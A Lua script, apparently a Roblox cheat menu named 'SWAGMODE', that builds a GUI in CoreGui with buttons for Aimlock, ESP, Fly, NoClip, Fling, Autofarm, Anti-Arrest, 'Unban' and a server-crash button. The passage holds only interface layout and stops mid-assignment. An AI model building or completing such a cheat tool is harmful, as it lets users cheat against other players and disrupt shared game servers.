if not game:IsLoaded() then
	game.Loaded:Wait()
end
local success,err = pcall(function()
local Swagmode = Instance.new("ScreenGui")
local SwagmodeFrame = Instance.new("Frame")
local MenuFrame = Instance.new("Frame")
local TogglesButton = Instance.new("TextButton")
local QuickTpButton = Instance.new("TextButton")
local SideButton = Instance.new("TextButton")
local imiecredits = Instance.new("TextLabel")
local Swagmode_2 = Instance.new("TextLabel")
local UIGradient = Instance.new("UIGradient")
local Frame = Instance.new("Frame")
local MainButton = Instance.new("TextButton")
local SellingButton = Instance.new("TextButton")
local DropShadowHolder = Instance.new("Frame")
local DropShadow = Instance.new("ImageLabel")
local TopLine = Instance.new("Frame")
local SideInfo = Instance.new("Frame")
local TargetImage = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local SetNearestButton = Instance.new("TextButton")
local CashLabel = Instance.new("TextLabel")
local TargetTextbox = Instance.new("TextBox")
local BountyLabel = Instance.new("TextLabel")
local CrewLabel = Instance.new("TextButton")
local Buttons = Instance.new("Frame")
local MainFrame = Instance.new("Frame")
local FreeFists = Instance.new("TextButton")
local GodBlock = Instance.new("TextButton")
local GodArmor = Instance.new("TextButton")
local FlySpeedMinus = Instance.new("TextButton")
local Fly = Instance.new("TextButton")
local Fling = Instance.new("TextButton")
local NoRecoil = Instance.new("TextButton")
local GoTo = Instance.new("TextButton")
local View = Instance.new("TextButton")
local Target = Instance.new("TextButton")
local FlySpeedPlus = Instance.new("TextButton")
local NoClip = Instance.new("TextButton")
local FlyMode = Instance.new("TextButton")
local Reach = Instance.new("TextButton")
local Headless = Instance.new("TextButton")
local QuickTpFrame = Instance.new("Frame")
local GunShop2 = Instance.new("TextButton")
local PrevPosition = Instance.new("TextButton")
local Bank = Instance.new("TextButton")
local SafeZone1 = Instance.new("TextButton")
local SetSpawn = Instance.new("TextButton")
local Sewer = Instance.new("TextButton")
local Playground = Instance.new("TextButton")
local GasStation = Instance.new("TextButton")
local LavaBase = Instance.new("TextButton")
local SavePos = Instance.new("TextButton")
local SafeZone2 = Instance.new("TextButton")
local UFO = Instance.new("TextButton")
local TacoShop = Instance.new("TextButton")
local LoadPos = Instance.new("TextButton")
local GunShop1 = Instance.new("TextButton")
local SideScriptsFrame = Instance.new("Frame")
local Aimlock = Instance.new("TextButton")
local Users = Instance.new("TextButton")
local MoneyESP = Instance.new("TextButton")
local FullGod = Instance.new("TextButton")
local Autofarm = Instance.new("TextButton")
local HighTool = Instance.new("TextButton")
local Esp = Instance.new("TextButton")
local LastingBullets = Instance.new("TextButton")
local Stamina = Instance.new("TextButton")
local Spin = Instance.new("TextButton")
local Unban = Instance.new("TextButton")
local SwagUsers = Instance.new("TextButton")
local LockTools = Instance.new("TextButton")
local Invisible = Instance.new("TextButton")
local InfTools = Instance.new("TextButton")
local TogglesFrame = Instance.new("Frame")
local QToTp = Instance.new("TextButton")
local QToTpColor = Instance.new("TextLabel")
local HideBlock = Instance.new("TextButton")
local HideBlockColor = Instance.new("TextLabel")
local HideUser = Instance.new("TextButton")
local HideUserColor = Instance.new("TextLabel")
local AutoStomp = Instance.new("TextButton")
local AutoStompColor = Instance.new("TextLabel")
local RocketRide = Instance.new("TextButton")
local RocketRideColor = Instance.new("TextLabel")
local AntiArrest = Instance.new("TextButton")
local AntiArrestColor = Instance.new("TextLabel")
local AntiGrab = Instance.new("TextButton")
local AntiGrabColor = Instance.new("TextLabel")
local AutoDrop = Instance.new("TextButton")
local AutoDropColor = Instance.new("TextLabel")
local AntiStomp = Instance.new("TextButton")
local AntiStompColor = Instance.new("TextLabel")
local AutoBlock = Instance.new("TextButton")
local AutoBlockColor = Instance.new("TextLabel")
local CashAura = Instance.new("TextButton")
local CashAuraColor = Instance.new("TextLabel")
local AntiEffects = Instance.new("TextButton")
local AntiEffectsColor = Instance.new("TextLabel")
local AltArmor = Instance.new("TextButton")
local AltArmorColor = Instance.new("TextLabel")
local AntiBag = Instance.new("TextButton")
local AntiBagColor = Instance.new("TextLabel")
local AntiSlow = Instance.new("TextButton")
local AntiSlowColor = Instance.new("TextLabel")
local SellingFrame = Instance.new("Frame")
local CashTextbox = Instance.new("TextBox")
local CashDropperTitle = Instance.new("TextLabel")
local CalculateButton = Instance.new("TextButton")
local DropToggleButton = Instance.new("TextButton")
local CashDroppedLabel = Instance.new("TextLabel")
local CashAtEndLabel = Instance.new("TextLabel")
local Frame_2 = Instance.new("Frame")
local CrashServerButton = Instance.new("TextButton")

--Properties:
Swagmode.Name = "Swagmode"
Swagmode.Parent = game.CoreGui
Swagmode.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

SwagmodeFrame.Name = "SwagmodeFrame"
SwagmodeFrame.Parent = Swagmode
SwagmodeFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
SwagmodeFrame.BorderSizePixel = 0
SwagmodeFrame.Position = UDim2.new(0.212884605, 0, 0.190036908, 0)
SwagmodeFrame.Size = UDim2.new(0, 605, 0, 336)

MenuFrame.Name = "MenuFrame"
MenuFrame.Parent = SwagmodeFrame
MenuFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MenuFrame.BorderSizePixel = 0
MenuFrame.Size = UDim2.new(0, 155, 0, 336)

TogglesButton.Name = "TogglesButton"
TogglesButton.Parent = MenuFrame
TogglesButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TogglesButton.BorderSizePixel = 0
TogglesButton.Position = UDim2.new(0.0922105312, 0, 0.440625668, 0)
TogglesButton.Size = UDim2.new(0, 123, 0, 31)
TogglesButton.AutoButtonColor = false
TogglesButton.Font = Enum.Font.GothamBlack
TogglesButton.Text = "Toggles"
TogglesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TogglesButton.TextSize = 14.000

QuickTpButton.Name = "QuickTpButton"
QuickTpButton.Parent = MenuFrame
QuickTpButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
QuickTpButton.BorderSizePixel = 0
QuickTpButton.Position = UDim2.new(0.0922105312, 0, 0.573581994, 0)
QuickTpButton.Size = UDim2.new(0, 123, 0, 31)
QuickTpButton.AutoButtonColor = false
QuickTpButton.Font = Enum.Font.GothamBlack
QuickTpButton.Text = "Quick TP"
QuickTpButton.TextColor3 = Color3.fromRGB(255, 255, 255)
QuickTpButton.TextSize = 14.000

SideButton.Name = "SideButton"
SideButton.Parent = MenuFrame
SideButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SideButton.BorderSizePixel = 0
SideButton.Position = UDim2.new(0.0922105312, 0, 0.307098716, 0)
SideButton.Size = UDim2.new(0, 123, 0, 31)
SideButton.AutoButtonColor = false
SideButton.Font = Enum.Font.GothamBlack
SideButton.Text = "Side Scripts"
SideButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SideButton.TextSize = 14.000

imiecredits.Name = "imiecredits"
imiecredits.Parent = MenuFrame
imiecredits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
imiecredits.BackgroundTransparency = 1.000
imiecredits.BorderSizePixel = 0
imiecredits.Position = UDim2.new(0.0507245474, 0, 0.854166687, 0)
imiecredits.Size = UDim2.new(0, 137, 0, 48)
imiecredits.Font = Enum.Font.GothamBold
imiecredits.Text = "credits"
imiecredits.TextColor3 = Color3.fromRGB(255, 255, 255)
imiecredits.TextSize = 14.000
imiecredits.TextXAlignment = Enum.TextXAlignment.Left
imiecredits.TextYAlignment = Enum.TextYAlignment.Top

Swagmode_2.Name = "Swagmode"
Swagmode_2.Parent = MenuFrame
Swagmode_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Swagmode_2.BackgroundTransparency = 1.000
Swagmode_2.Position = UDim2.new(0.045161292, 0, 0, 0)
Swagmode_2.Size = UDim2.new(0, 115, 0, 34)
Swagmode_2.Font = Enum.Font.GothamBlack
Swagmode_2.Text = "SWAGMODE"
Swagmode_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Swagmode_2.TextSize = 20.000

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(49, 48, 70)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient.Offset = Vector2.new(0.100000001, 0)
UIGradient.Parent = Swagmode_2

Frame.Parent = MenuFrame
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.045161292, 0, 0.092261903, 0)
Frame.Size = UDim2.new(0, 126, 0, 3)

MainButton.Name = "MainButton"
MainButton.Parent = MenuFrame
MainButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainButton.BorderSizePixel = 0
MainButton.Position = UDim2.new(0.0922105238, 0, 0.178689778, 0)
MainButton.Size = UDim2.new(0, 123, 0, 31)
MainButton.AutoButtonColor = false
MainButton.Font = Enum.Font.GothamBlack
MainButton.Text = "Main Scripts"
MainButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MainButton.TextSize = 14.000

SellingButton.Name = "SellingButton"
SellingButton.Parent = MenuFrame
SellingButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SellingButton.BorderSizePixel = 0
SellingButton.Position = UDim2.new(0.0986621454, 0, 0.716439128, 0)
SellingButton.Size = UDim2.new(0, 123, 0, 31)
SellingButton.AutoButtonColor = false
SellingButton.Font = Enum.Font.GothamBlack
SellingButton.Text = "Selling Tools"
SellingButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SellingButton.TextSize = 14.000

DropShadowHolder.Name = "DropShadowHolder"
DropShadowHolder.Parent = SwagmodeFrame
DropShadowHolder.BackgroundTransparency = 1.000
DropShadowHolder.BorderSizePixel = 0
DropShadowHolder.Size = UDim2.new(1, 0, 1, 0)
DropShadowHolder.ZIndex = 0

DropShadow.Name = "DropShadow"
DropShadow.Parent = DropShadowHolder
DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
DropShadow.BackgroundTransparency = 1.000
DropShadow.BorderSizePixel = 0
DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
DropShadow.Size = UDim2.new(1, 47, 1, 47)
DropShadow.ZIndex = 0
DropShadow.Image = "rbxassetid://6015897843"
DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
DropShadow.ImageTransparency = 0.200
DropShadow.ScaleType = Enum.ScaleType.Slice
DropShadow.SliceCenter = Rect.new(49, 49, 450, 450)

TopLine.Name = "TopLine"
TopLine.Parent = SwagmodeFrame
TopLine.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
TopLine.BorderSizePixel = 0
TopLine.Position = UDim2.new(0.256198347, 0, 0, 0)
TopLine.Size = UDim2.new(0, 450, 0, 7)

SideInfo.Name = "SideInfo"
SideInfo.Parent = SwagmodeFrame
SideInfo.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SideInfo.BorderSizePixel = 0
SideInfo.Position = UDim2.new(0.778512418, 0, 0.020833334, 0)
SideInfo.Size = UDim2.new(0, 134, 0, 329)

TargetImage.Name = "TargetImage"
TargetImage.Parent = SideInfo
TargetImage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TargetImage.Position = UDim2.new(0.0950299203, 0, 0.0244709235, 0)
TargetImage.Size = UDim2.new(0, 108, 0, 104)
TargetImage.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
TargetImage.ImageColor3 = Color3.fromRGB(300, 300, 300)

UICorner.CornerRadius = UDim.new(0, 500)
UICorner.Parent = TargetImage

SetNearestButton.Name = "SetNearestButton"
SetNearestButton.Parent = SideInfo
SetNearestButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SetNearestButton.BorderSizePixel = 0
SetNearestButton.Position = UDim2.new(0.072641857, 0, 0.851063848, 0)
SetNearestButton.Size = UDim2.new(0, 114, 0, 29)
SetNearestButton.AutoButtonColor = false
SetNearestButton.Font = Enum.Font.GothamBlack
SetNearestButton.Text = "Set Nearest"
SetNearestButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SetNearestButton.TextSize = 14.000

CashLabel.Name = "CashLabel"
CashLabel.Parent = SideInfo
CashLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
CashLabel.BorderSizePixel = 0
CashLabel.Position = UDim2.new(0.072641857, 0, 0.519756854, 0)
CashLabel.Size = UDim2.new(0, 115, 0, 26)
CashLabel.Font = Enum.Font.SourceSans
CashLabel.Text = "Cash:"
CashLabel.TextColor3 = Color3.fromRGB(72, 72, 72)
CashLabel.TextSize = 14.000

TargetTextbox.Name = "TargetTextbox"
TargetTextbox.Parent = SideInfo
TargetTextbox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TargetTextbox.BorderSizePixel = 0
TargetTextbox.Position = UDim2.new(0.072641857, 0, 0.392097205, 0)
TargetTextbox.Size = UDim2.new(0, 115, 0, 31)
TargetTextbox.Font = Enum.Font.GothamBlack
TargetTextbox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
TargetTextbox.Text = ""
TargetTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
TargetTextbox.TextSize = 14.000
TargetTextbox.TextWrapped = true
TargetTextbox.TextScaled = true

BountyLabel.Name = "BountyLabel"
BountyLabel.Parent = SideInfo
BountyLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
BountyLabel.BorderSizePixel = 0
BountyLabel.Position = UDim2.new(0.072641857, 0, 0.633550763, 0)
BountyLabel.Size = UDim2.new(0, 115, 0, 26)
BountyLabel.Font = Enum.Font.SourceSans
BountyLabel.Text = "Bounty:"
BountyLabel.TextColor3 = Color3.fromRGB(72, 72, 72)
BountyLabel.TextSize = 14.000

CrewLabel.Name = "CrewLabel"
CrewLabel.Parent = SideInfo
CrewLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
CrewLabel.BorderSizePixel = 0
CrewLabel.Position = UDim2.new(0.072641857, 0, 0.737304032, 0)
CrewLabel.Size = UDim2.new(0, 115, 0, 26)
CrewLabel.Font = Enum.Font.SourceSans
CrewLabel.Text = "Crew:"
CrewLabel.TextColor3 = Color3.fromRGB(72, 72, 72)
CrewLabel.TextSize = 14.000
CrewLabel.TextScaled = true

Buttons.Name = "Buttons"
Buttons.Parent = SwagmodeFrame
Buttons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Buttons.BackgroundTransparency = 1.000
Buttons.Position = UDim2.new(0.256198347, 0, 0.0297619049, 0)
Buttons.Size = UDim2.new(0, 316, 0, 325)

MainFrame.Name = "MainFrame"
MainFrame.Parent = Buttons
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BackgroundTransparency = 1.000
MainFrame.Size = UDim2.new(0, 316, 0, 325)
MainFrame.Visible = true

FreeFists.Name = "FreeFists"
FreeFists.Parent = MainFrame
FreeFists.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
FreeFists.BorderSizePixel = 0
FreeFists.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
FreeFists.Size = UDim2.new(0, 94, 0, 46)
FreeFists.Font = Enum.Font.GothamBlack
FreeFists.Text = "FreeFists(T)"
FreeFists.TextColor3 = Color3.fromRGB(255, 255, 255)
FreeFists.TextSize = 14.000

GodBlock.Name = "GodBlock"
GodBlock.Parent = MainFrame
GodBlock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GodBlock.BorderSizePixel = 0
GodBlock.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
GodBlock.Size = UDim2.new(0, 94, 0, 46)
GodBlock.Font = Enum.Font.GothamBlack
GodBlock.Text = "GodBlock"
GodBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
GodBlock.TextSize = 14.000

GodArmor.Name = "GodArmor"
GodArmor.Parent = MainFrame
GodArmor.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GodArmor.BorderSizePixel = 0
GodArmor.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
GodArmor.Size = UDim2.new(0, 94, 0, 46)
GodArmor.Font = Enum.Font.GothamBlack
GodArmor.Text = "GodArmor"
GodArmor.TextColor3 = Color3.fromRGB(255, 255, 255)
GodArmor.TextSize = 14.000

FlySpeedMinus.Name = "FlySpeedMinus"
FlySpeedMinus.Parent = MainFrame
FlySpeedMinus.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
FlySpeedMinus.BorderSizePixel = 0
FlySpeedMinus.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
FlySpeedMinus.Size = UDim2.new(0, 94, 0, 46)
FlySpeedMinus.Font = Enum.Font.GothamBlack
FlySpeedMinus.Text = "FlySpeed -"
FlySpeedMinus.TextColor3 = Color3.fromRGB(255, 255, 255)
FlySpeedMinus.TextSize = 14.000

Fly.Name = "Fly"
Fly.Parent = MainFrame
Fly.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Fly.BorderSizePixel = 0
Fly.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
Fly.Size = UDim2.new(0, 94, 0, 46)
Fly.Font = Enum.Font.GothamBlack
Fly.Text = "Fly(X)"
Fly.TextColor3 = Color3.fromRGB(255, 255, 255)
Fly.TextSize = 14.000

Fling.Name = "Fling"
Fling.Parent = MainFrame
Fling.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Fling.BorderSizePixel = 0
Fling.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
Fling.Size = UDim2.new(0, 94, 0, 46)
Fling.Font = Enum.Font.GothamBlack
Fling.Text = "Fling"
Fling.TextColor3 = Color3.fromRGB(255, 255, 255)
Fling.TextSize = 14.000

NoRecoil.Name = "NoRecoil"
NoRecoil.Parent = MainFrame
NoRecoil.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
NoRecoil.BorderSizePixel = 0
NoRecoil.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
NoRecoil.Size = UDim2.new(0, 94, 0, 46)
NoRecoil.Font = Enum.Font.GothamBlack
NoRecoil.Text = "NoRecoil"
NoRecoil.TextColor3 = Color3.fromRGB(255, 255, 255)
NoRecoil.TextSize = 14.000

GoTo.Name = "GoTo"
GoTo.Parent = MainFrame
GoTo.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GoTo.BorderSizePixel = 0
GoTo.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
GoTo.Size = UDim2.new(0, 94, 0, 46)
GoTo.Font = Enum.Font.GothamBlack
GoTo.Text = "GoTo"
GoTo.TextColor3 = Color3.fromRGB(255, 255, 255)
GoTo.TextSize = 14.000

View.Name = "View"
View.Parent = MainFrame
View.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
View.BorderSizePixel = 0
View.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
View.Size = UDim2.new(0, 94, 0, 46)
View.Font = Enum.Font.GothamBlack
View.Text = "View"
View.TextColor3 = Color3.fromRGB(255, 255, 255)
View.TextSize = 14.000

Target.Name = "Target"
Target.Parent = MainFrame
Target.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Target.BorderSizePixel = 0
Target.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
Target.Size = UDim2.new(0, 94, 0, 46)
Target.Font = Enum.Font.GothamBlack
Target.Text = "Target"
Target.TextColor3 = Color3.fromRGB(255, 255, 255)
Target.TextSize = 14.000

FlySpeedPlus.Name = "FlySpeedPlus"
FlySpeedPlus.Parent = MainFrame
FlySpeedPlus.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
FlySpeedPlus.BorderSizePixel = 0
FlySpeedPlus.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
FlySpeedPlus.Size = UDim2.new(0, 94, 0, 46)
FlySpeedPlus.Font = Enum.Font.GothamBlack
FlySpeedPlus.Text = "FlySpeed +"
FlySpeedPlus.TextColor3 = Color3.fromRGB(255, 255, 255)
FlySpeedPlus.TextSize = 14.000

NoClip.Name = "NoClip"
NoClip.Parent = MainFrame
NoClip.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
NoClip.BorderSizePixel = 0
NoClip.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
NoClip.Size = UDim2.new(0, 94, 0, 46)
NoClip.Font = Enum.Font.GothamBlack
NoClip.Text = "NoClip(Z)"
NoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
NoClip.TextSize = 14.000

FlyMode.Name = "FlyMode"
FlyMode.Parent = MainFrame
FlyMode.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
FlyMode.BorderSizePixel = 0
FlyMode.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
FlyMode.Size = UDim2.new(0, 94, 0, 46)
FlyMode.Font = Enum.Font.GothamBlack
FlyMode.Text = "FlyMode"
FlyMode.TextColor3 = Color3.fromRGB(255, 255, 255)
FlyMode.TextSize = 14.000

Reach.Name = "Reach"
Reach.Parent = MainFrame
Reach.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Reach.BorderSizePixel = 0
Reach.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
Reach.Size = UDim2.new(0, 94, 0, 46)
Reach.Font = Enum.Font.GothamBlack
Reach.Text = "Reach"
Reach.TextColor3 = Color3.fromRGB(255, 255, 255)
Reach.TextSize = 14.000

Headless.Name = "Headless"
Headless.Parent = MainFrame
Headless.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Headless.BorderSizePixel = 0
Headless.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
Headless.Size = UDim2.new(0, 94, 0, 46)
Headless.Font = Enum.Font.GothamBlack
Headless.Text = "Headless"
Headless.TextColor3 = Color3.fromRGB(255, 255, 255)
Headless.TextSize = 14.000

QuickTpFrame.Name = "QuickTpFrame"
QuickTpFrame.Parent = Buttons
QuickTpFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
QuickTpFrame.BackgroundTransparency = 1.000
QuickTpFrame.Size = UDim2.new(0, 316, 0, 325)
QuickTpFrame.Visible = false

GunShop2.Name = "GunShop2"
GunShop2.Parent = QuickTpFrame
GunShop2.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GunShop2.BorderSizePixel = 0
GunShop2.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
GunShop2.Size = UDim2.new(0, 94, 0, 46)
GunShop2.Font = Enum.Font.GothamBlack
GunShop2.Text = "GunShop(UP)"
GunShop2.TextColor3 = Color3.fromRGB(255, 255, 255)
GunShop2.TextSize = 14.000

PrevPosition.Name = "PrevPosition"
PrevPosition.Parent = QuickTpFrame
PrevPosition.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
PrevPosition.BorderSizePixel = 0
PrevPosition.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
PrevPosition.Size = UDim2.new(0, 94, 0, 46)
PrevPosition.Font = Enum.Font.GothamBlack
PrevPosition.Text = "PrevPos"
PrevPosition.TextColor3 = Color3.fromRGB(255, 255, 255)
PrevPosition.TextSize = 14.000

Bank.Name = "Bank"
Bank.Parent = QuickTpFrame
Bank.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Bank.BorderSizePixel = 0
Bank.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
Bank.Size = UDim2.new(0, 94, 0, 46)
Bank.Font = Enum.Font.GothamBlack
Bank.Text = "Bank"
Bank.TextColor3 = Color3.fromRGB(255, 255, 255)
Bank.TextSize = 14.000

SafeZone1.Name = "SafeZone1"
SafeZone1.Parent = QuickTpFrame
SafeZone1.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SafeZone1.BorderSizePixel = 0
SafeZone1.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
SafeZone1.Size = UDim2.new(0, 94, 0, 46)
SafeZone1.Font = Enum.Font.GothamBlack
SafeZone1.Text = "Safe Zone #1"
SafeZone1.TextColor3 = Color3.fromRGB(255, 255, 255)
SafeZone1.TextSize = 14.000

SetSpawn.Name = "SetSpawn"
SetSpawn.Parent = QuickTpFrame
SetSpawn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SetSpawn.BorderSizePixel = 0
SetSpawn.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
SetSpawn.Size = UDim2.new(0, 94, 0, 46)
SetSpawn.Font = Enum.Font.GothamBlack
SetSpawn.Text = "SetSpawn"
SetSpawn.TextColor3 = Color3.fromRGB(255, 255, 255)
SetSpawn.TextSize = 14.000

Sewer.Name = "Sewer"
Sewer.Parent = QuickTpFrame
Sewer.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Sewer.BorderSizePixel = 0
Sewer.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
Sewer.Size = UDim2.new(0, 94, 0, 46)
Sewer.Font = Enum.Font.GothamBlack
Sewer.Text = "Sewer"
Sewer.TextColor3 = Color3.fromRGB(255, 255, 255)
Sewer.TextSize = 14.000

Playground.Name = "Playground"
Playground.Parent = QuickTpFrame
Playground.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Playground.BorderSizePixel = 0
Playground.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
Playground.Size = UDim2.new(0, 94, 0, 46)
Playground.Font = Enum.Font.GothamBlack
Playground.Text = "Playground"
Playground.TextColor3 = Color3.fromRGB(255, 255, 255)
Playground.TextSize = 14.000

GasStation.Name = "GasStation"
GasStation.Parent = QuickTpFrame
GasStation.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GasStation.BorderSizePixel = 0
GasStation.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
GasStation.Size = UDim2.new(0, 94, 0, 46)
GasStation.Font = Enum.Font.GothamBlack
GasStation.Text = "GasStation"
GasStation.TextColor3 = Color3.fromRGB(255, 255, 255)
GasStation.TextSize = 14.000

LavaBase.Name = "LavaBase"
LavaBase.Parent = QuickTpFrame
LavaBase.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
LavaBase.BorderSizePixel = 0
LavaBase.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
LavaBase.Size = UDim2.new(0, 94, 0, 46)
LavaBase.Font = Enum.Font.GothamBlack
LavaBase.Text = "LavaBase"
LavaBase.TextColor3 = Color3.fromRGB(255, 255, 255)
LavaBase.TextSize = 14.000

SavePos.Name = "SavePos"
SavePos.Parent = QuickTpFrame
SavePos.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SavePos.BorderSizePixel = 0
SavePos.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
SavePos.Size = UDim2.new(0, 94, 0, 46)
SavePos.Font = Enum.Font.GothamBlack
SavePos.Text = "SavePos"
SavePos.TextColor3 = Color3.fromRGB(255, 255, 255)
SavePos.TextSize = 14.000

SafeZone2.Name = "SafeZone2"
SafeZone2.Parent = QuickTpFrame
SafeZone2.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SafeZone2.BorderSizePixel = 0
SafeZone2.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
SafeZone2.Size = UDim2.new(0, 94, 0, 46)
SafeZone2.Font = Enum.Font.GothamBlack
SafeZone2.Text = "Safe Zone #2"
SafeZone2.TextColor3 = Color3.fromRGB(255, 255, 255)
SafeZone2.TextSize = 14.000

UFO.Name = "UFO"
UFO.Parent = QuickTpFrame
UFO.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
UFO.BorderSizePixel = 0
UFO.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
UFO.Size = UDim2.new(0, 94, 0, 46)
UFO.Font = Enum.Font.GothamBlack
UFO.Text = "UFO"
UFO.TextColor3 = Color3.fromRGB(255, 255, 255)
UFO.TextSize = 14.000

TacoShop.Name = "TacoShop"
TacoShop.Parent = QuickTpFrame
TacoShop.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
TacoShop.BorderSizePixel = 0
TacoShop.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
TacoShop.Size = UDim2.new(0, 94, 0, 46)
TacoShop.Font = Enum.Font.GothamBlack
TacoShop.Text = "TacoShop"
TacoShop.TextColor3 = Color3.fromRGB(255, 255, 255)
TacoShop.TextSize = 14.000

LoadPos.Name = "LoadPos"
LoadPos.Parent = QuickTpFrame
LoadPos.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
LoadPos.BorderSizePixel = 0
LoadPos.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
LoadPos.Size = UDim2.new(0, 94, 0, 46)
LoadPos.Font = Enum.Font.GothamBlack
LoadPos.Text = "LoadPos"
LoadPos.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadPos.TextSize = 14.000

GunShop1.Name = "GunShop1"
GunShop1.Parent = QuickTpFrame
GunShop1.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GunShop1.BorderSizePixel = 0
GunShop1.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
GunShop1.Size = UDim2.new(0, 94, 0, 46)
GunShop1.Font = Enum.Font.GothamBlack
GunShop1.Text = "GunShop(AK)"
GunShop1.TextColor3 = Color3.fromRGB(255, 255, 255)
GunShop1.TextSize = 14.000

SideScriptsFrame.Name = "SideScriptsFrame"
SideScriptsFrame.Parent = Buttons
SideScriptsFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SideScriptsFrame.BackgroundTransparency = 1.000
SideScriptsFrame.Size = UDim2.new(0, 316, 0, 325)
SideScriptsFrame.Visible = false

Aimlock.Name = "Aimlock"
Aimlock.Parent = SideScriptsFrame
Aimlock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Aimlock.BorderSizePixel = 0
Aimlock.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
Aimlock.Size = UDim2.new(0, 94, 0, 46)
Aimlock.Font = Enum.Font.GothamBlack
Aimlock.Text = "Aimlock"
Aimlock.TextColor3 = Color3.fromRGB(255, 255, 255)
Aimlock.TextSize = 14.000

Users.Name = "Users"
